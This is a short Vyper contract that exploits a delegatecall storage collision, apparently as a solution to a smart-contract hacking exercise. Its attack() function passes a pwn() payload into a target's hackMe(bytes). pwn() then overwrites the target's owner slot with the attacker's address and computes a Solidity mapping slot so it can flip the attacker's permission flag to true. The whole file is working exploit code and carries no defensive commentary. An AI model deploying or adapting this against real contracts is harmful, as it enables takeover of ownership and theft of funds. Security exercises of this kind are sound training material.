# @version ^0.3.7

owner: immutable(address)

slot_zero: uint256
slot_one: uint256 
slot_two: uint256
slot_three: uint256
slot_four: uint256
slot_five: public(address)
slot_six: public(bool[max_value(uint256)])

@external
@payable
def __init__():
    owner = msg.sender

@external
def pwn():
    self.slot_five = owner
    index: uint256 = self._get_solidity_map_loc(6, owner)
    self.slot_six[index - 6] = True

@external
def attack(addr: address):
    raw_call(
        addr,
        _abi_encode(method_id("pwn()"), method_id=method_id("hackMe(bytes)"))
    )

@internal
def _get_solidity_map_loc(slot: uint256, key: address) -> uint256:
    _slot: bytes32 = convert(slot, bytes32)
    addr: bytes32 = convert(key, bytes32)
    concated_data: Bytes[64] = concat(addr, _slot)
    hash: bytes32 = keccak256(concated_data)
    return convert(hash, uint256)
